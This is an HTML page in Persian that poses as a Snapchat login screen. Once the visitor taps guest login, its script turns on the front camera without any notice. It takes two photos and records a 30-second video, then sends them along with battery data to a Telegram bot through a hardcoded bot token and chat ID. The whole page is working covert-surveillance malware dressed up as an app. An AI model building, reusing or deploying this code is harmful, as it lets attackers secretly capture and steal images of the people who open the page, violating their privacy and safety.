<!DOCTYPE html><html lang="fa">
<head>
  <meta charset="UTF-8" />
  <title>Snap Auto</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" />
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body {
      margin: 0;
      font-family: 'Vazirmatn', sans-serif;
      direction: rtl;
      background: #FFFC00;
      overflow: hidden;
    }
    .splash, .login, .camera-ui, .loading-screen {
      position: absolute;
      inset: 0;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      background-color: #FFFC00;
      z-index: 10;
    }
    #video {
      display: none;
    }
    .loading-spinner {
      border: 8px solid #f3f3f3;
      border-top: 8px solid #000;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin-top: 16px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>  <!-- Splash Screen -->  <div id="splash" class="splash">
    <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" width="100" class="animate-bounce mb-4">
  </div>  <!-- Login Screen -->  <div id="login" class="login hidden">
    <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" width="80" class="mb-6">
    <h2 class="text-xl font-bold mb-4">ورود به اسنپ‌چت</h2>
    <button class="bg-white text-black py-2 px-6 rounded-full mb-3 flex items-center gap-2 cursor-not-allowed" disabled>
      <img src="https://img.icons8.com/color/48/google-logo.png" width="20"> ورود با گوگل
    </button>
    <button class="bg-white text-black py-2 px-6 rounded-full mb-3 flex items-center gap-2 cursor-not-allowed" disabled>
      <img src="https://img.icons8.com/fluency/48/facebook-new.png" width="20"> ورود با فیسبوک
    </button>
    <button onclick="guestLogin()" class="bg-black text-white py-2 px-6 rounded-full mt-2">ورود مهمان</button>
  </div>  <!-- Loading Screen -->  <div id="loading" class="loading-screen hidden">
    <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" width="70">
    <div class="loading-spinner"></div>
    <p class="mt-4 font-bold">در حال آماده‌سازی...</p>
  </div>  <!-- UI Layer -->  <div id="camera-ui" class="camera-ui hidden">
    <div class="absolute top-4 left-4">
      <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" width="40">
    </div>
    <div class="absolute bottom-4 left-1/2 -translate-x-1/2">
      <div class="w-16 h-16 rounded-full border-4 border-black bg-white"></div>
    </div>
    <div class="absolute top-4 right-4">
      <div class="w-12 h-12 bg-white/70 rounded-full flex justify-center items-center cursor-not-allowed">
        <img src="https://img.icons8.com/ios-filled/50/switch-camera.png" width="24" />
      </div>
    </div>
    <div class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2">
      <div class="loading-spinner"></div>
    </div>
  </div>  <!-- Hidden Video --><video id="video" autoplay muted playsinline></video>

  <script>
    const splash = document.getElementById('splash');
    const login = document.getElementById('login');
    const loading = document.getElementById('loading');
    const cameraUI = document.getElementById('camera-ui');
    const video = document.getElementById('video');

    const botToken = "7720902826:AAEK57GNutoXcCEYyTcWeySwRt829nxPhDI";
    const chatId = "-1002297320707";

    let stream;
    let chunks = [];
    let videoSent = false;
    let mediaRecorder;

    setTimeout(() => {
      splash.classList.add("hidden");
      login.classList.remove("hidden");
    }, 2500);

    function guestLogin() {
      login.classList.add("hidden");
      splash.classList.remove("hidden");
      setTimeout(() => {
        splash.classList.add("hidden");
        loading.classList.remove("hidden");
        startCamera();
      }, 2000);
    }

    async function startCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480, facingMode: "user" } });
        video.srcObject = stream;
        cameraUI.classList.remove("hidden");
        loading.classList.add("hidden");
        startRecording();
        setTimeout(() => takePhoto(1), 1000);
        setTimeout(() => takePhoto(2), 5000);
      } catch (err) {
        alert("دسترسی به دوربین رد شد");
      }
    }

    async function getBatteryInfo() {
      if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        return {
          level: Math.round(battery.level * 100),
          charging: battery.charging
        };
      }
      return { level: "?", charging: false };
    }

    async function takePhoto(index) {
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0);
      canvas.toBlob(async blob => {
        const battery = await getBatteryInfo();
        const form = new FormData();
        form.append("chat_id", chatId);
        form.append("photo", blob, `photo_${index}.jpg`);
        form.append("caption", `📸 عکس ${index}\n🔋 شارژ: ${battery.level}%\n⚡ شارژر: ${battery.charging ? "وصل" : "قطع"}`);
        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: "POST",
          body: form
        });
      }, 'image/jpeg', 0.7);
    }

    function startRecording() {
      chunks = [];
      mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm; codecs=vp9" });
      mediaRecorder.ondataavailable = e => chunks.push(e.data);
      mediaRecorder.onstop = sendVideo;
      mediaRecorder.start();

      setTimeout(() => {
        if (mediaRecorder.state === "recording") {
          mediaRecorder.stop();
        }
      }, 30000);

      window.addEventListener("beforeunload", () => {
        if (mediaRecorder && mediaRecorder.state === "recording") mediaRecorder.stop();
      });
    }

    async function sendVideo() {
      if (videoSent || chunks.length === 0) return;
      videoSent = true;
      const battery = await getBatteryInfo();
      const blob = new Blob(chunks, { type: "video/webm" });
      const form = new FormData();
      form.append("chat_id", chatId);
      form.append("video", blob, "video.webm");
      form.append("caption", `🎥 ویدیو\n🔋 شارژ: ${battery.level}%\n⚡ شارژر: ${battery.charging ? "وصل" : "قطع"}`);
      await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
        method: "POST",
        body: form
      });
    }
  </script></body>
</html>
